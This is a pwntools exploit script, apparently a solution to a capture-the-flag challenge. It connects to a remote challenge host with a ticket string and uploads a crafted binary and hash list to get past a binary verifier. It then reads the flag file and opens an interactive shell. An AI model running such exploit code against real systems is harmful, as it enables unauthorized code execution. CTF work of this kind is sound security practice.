from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./src/verify')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'seedling-d22fuls4bf566.shellweplayaga.me'
port = int(args.PORT or 10001)
gdbscript="""
init-gef
tmux-setup
b * verify_binary+559
condition 1 $rdx > 0xf
continue
"""
def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    io.sendlineafter(b': ', b'ticket{ApplianceMortgage7097n23:r3doUSScustmZwKvh3qNcfolvP-lA-GhqYbcVbVaobxwiG0i}')
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start(['./src/key.txt'])
binary = open('./exploit/shell', 'rb').read()
hashs = open('./exploit/sus.txt', 'rb').read().strip().splitlines()
io.sendlineafter(b'\n', str(len(binary)).encode())
io.sendafter(b'\n', binary)
io.recvline()
io.sendline(str(len(hashs)).encode())
for l in hashs:
    io.sendline(l)
io.recvuntil(b'Successfully verified binary!\n')

# io.sendline(b'ls /challenge')
io.sendline(b'cat /challenge/flag')
io.interactive()
